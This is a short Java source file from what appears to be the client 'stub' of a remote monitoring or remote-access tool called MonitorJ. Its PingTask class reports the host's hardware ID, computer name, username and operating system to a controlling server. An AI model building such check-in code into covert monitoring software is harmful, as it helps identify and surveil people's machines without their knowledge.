package me.jershdervis.monitorj.stub.client.tasks;

import me.jershdervis.monitorj.stub.client.PacketTask;
import me.jershdervis.monitorj.stub.client.Packets;
import me.jershdervis.monitorj.stub.util.ClientSystemUtil;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.util.Locale;

/**
 * Created by Josh on 19/06/2015.
 */
public class PingTask extends PacketTask {

    public PingTask() {
        super(Packets.PING);
    }

    @Override
    public void run(DataInputStream inputStream, DataOutputStream outputStream) throws IOException {
        outputStream.writeByte(Packets.PING); //Tell the server to act on the ping packet
        outputStream.writeUTF(ClientSystemUtil.getHWID());
        outputStream.writeUTF(ClientSystemUtil.getComputerName());
        outputStream.writeUTF(ClientSystemUtil.getUsername());
        outputStream.writeUTF(System.getProperty("os.name", "generic").toLowerCase(Locale.ENGLISH));
    }
}
